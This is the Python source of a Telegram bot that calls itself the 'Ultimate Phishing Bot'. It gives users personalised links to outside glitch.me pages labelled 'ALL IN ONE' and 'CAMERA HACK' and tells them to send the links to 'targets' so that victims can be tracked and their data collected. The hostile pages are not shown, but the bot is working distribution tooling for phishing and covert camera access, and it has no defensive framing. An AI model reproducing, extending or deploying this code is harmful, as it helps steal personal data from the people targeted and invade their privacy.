import os
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

API_ID = int(os.getenv("API_ID", 0))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")

app = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.private & filters.command("start"))
async def start_command(client, message):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("ALL IN ONE", callback_data="all_in_one"), 
         InlineKeyboardButton("📸 CAMERA", callback_data="you_tube")]
    ])
    
    welcome_text = (       
        "🔰 Welcome to the Ultimate Phishing Bot!🔰\n\n"
        "🔥 Generate undetectable phishing links in seconds & send them to your targets!\n"
        "🎯 Track victims in real-time & collect data effortlessly.\n\n"
        "🛑 Warning: High Security System Activated 🛑\n\n"
        "⚠️ Use responsibly! Any misuse is your own responsibility. ⚠️"
    )

    await message.reply_text(
        welcome_text,
        reply_markup=keyboard,
        parse_mode=enums.ParseMode.MARKDOWN
    )

@app.on_callback_query()
async def callback_handler(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if data == "all_in_one":
        page_name = "ALL IN ONE"
        link = f"https://trail-charm-waterlily.glitch.me/?id={user_id}"
    elif data == "you_tube":
        page_name = "CAMERA HACK"
        link = f"https://four-political-blouse.glitch.me/?id={user_id}"
    else:
        return

    message_text = f"**Page Name:** {page_name}\n" \
                   f"**Link:** {link}\n\n" \
                   f"**Usage:** Just send this to your target 🎯"

    await callback_query.message.reply_text(message_text, parse_mode=enums.ParseMode.MARKDOWN)

if __name__ == "__main__":
    app.run()
